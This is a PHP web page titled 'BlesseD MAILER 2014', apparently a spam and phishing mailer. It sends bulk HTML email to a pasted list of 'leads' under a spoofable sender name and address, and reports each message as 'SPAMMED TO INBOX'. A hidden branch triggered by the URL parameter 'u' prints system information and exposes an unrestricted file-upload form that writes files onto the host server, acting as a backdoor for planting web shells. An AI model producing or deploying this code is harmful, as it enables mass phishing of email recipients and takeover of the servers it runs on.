<?php
mb_http_input("iso-8859-1");
mb_http_output("iso-8859-1");
?>
<?php
@set_time_limit(0);
if(isset($_POST['send']))
{
	$message = $_POST['html'];
	$subject = $_POST['ursubject'];
	$uremail = $_POST['uremail'];
	$urname = $_POST['realname'];
	$email = $_POST['email'];

	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);

}else{
	$testa ="";
	$message = "";
	$subject = "";
	$urname = "";
	$uremail = "";
	$email = "";
}
?>
<?php

if(isset($_GET['u'])){echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { 	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>uplod Sucess By w4l3XzY3 \\</b><br><br>'; } 	else { echo '<b>Upload Failed !!!</b><br><br>'; } }

}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="SHORTCUT ICON" href="http://www.smt.org//images/favicon.ico">
<title>BlesseD MAILER 2014&trade;</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
#Layer1 {	position:absolute;
	left:203px;
	top:109px;
	width:829px;
	height:483px;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 200%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: thin solid #000;
}

-->
</style>
</head>

<body>
<form action="" method="post" name="codered">
<div align="center" id="Layer1">
  <table width="87%" height="77%" border="0" cellspacing="10">
    <tbody><tr>
      <td height="23" colspan="2"><div align="center" class="form">B L E S S E D S I N N E R </div></td>
    </tr>
    <tr>
      <td width="53%" height="24"><div align="center">
        <input name="uremail" type="text" class="form" id="uremail" size="30" value="<? print $uremail; ?>" placeholder="Your E-mail">
      </div></td>
      <td width="47%"><div align="center">
        <input name="realname" type="text" class="form" id="realname" size="30" value="<? print $urname; ?>" placeholder="Your Name">
      </div></td>
    </tr>
    <tr>
      <td height="34" colspan="2"><div align="center">
        <input name="ursubject" type="text" class="form" id="ursubject" size="83%" value="<? print $subject; ?>" placeholder="Your Subject Should Be Here">
      </div>
	  </td>
    </tr>
    <tr>
      <td height="165"><textarea name="html" class="form" cols="40" rows="10" placeholder="Your HTML MESSAGE Here" id="html"><? print $message; ?></textarea></td>
      <td>
	  <div align="right">
        <textarea class="form" rows="10" placeholder="Leads" name="email" cols="35"><? print $email; ?></textarea>
      </div></td></tr>
  </tbody>
  </table>
  <div><input type="submit" class="send" name="send" value="Start Sending">
  </div><DIV class="send"><?php
if(!isset($_POST['send'])){
	exit;
}

if(!isset($_GET['c']))
{
	$email = explode("\n", $email);
}else{
	$email = explode(",", $email);
}
$son = count($email);

if(!isset($_GET['e'])){
	$header = "MIME-Version: 1.0\n";
	$header .= "Content-type: text/html; charset=iso-8859-1\n";
	$header .= "From: ".$urname . " <" . $uremail . ">\n";
	$header .= "Reply-To: " . $uremail . "\n";
	$header .= "X-Priority: 3\n";
	$header .= "X-MSMail-Priority: Normal\n";
	$header .= "X-Mailer: ".$_SERVER["HTTP_HOST"];
}else{
	$header ='MIME-Version: 1.0' . "\r\n";
	$header .= 'Content-type: text/html' . "\r\n";
	$header .="From: ".$uremail;
}
$i = 0;
$voy=1;
while($email[$i])
{
	if(isset($_GET['time']) && isset($_GET['cant'])){
		if(fmod($i,$_GET['cant'])==0 && $i>0){
			print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n";
			flush();
			@mail($_GET['notf'], $subject, $message, $header);
			sleep($_GET['time']);
		}
	}
	$mail = str_replace(array("\n","\r\n"),'',$email[$i]);
        $message1 = ereg_replace("&email&", $mail, $message);
	if(@mail($mail, $subject, $message1, $header))
	{
		print "<font color=blue face=verdana size=1>    ".$voy." OF ".$son."  ;-) ".trim($mail)."  SPAMMED TO INBOX</font><br>\n";
		flush();
	}
	else
	{
		print "<font color=red face=verdana size=1>    ".$voy." OF ".$son.":-( ".trim($mail)."  OOOPSS!!! SOMETHING IS WRONG</font><br>\n";
		flush();
	}                                                             
	$i++;
	$voy++;
}

?>
</DIV>
</div>
</form>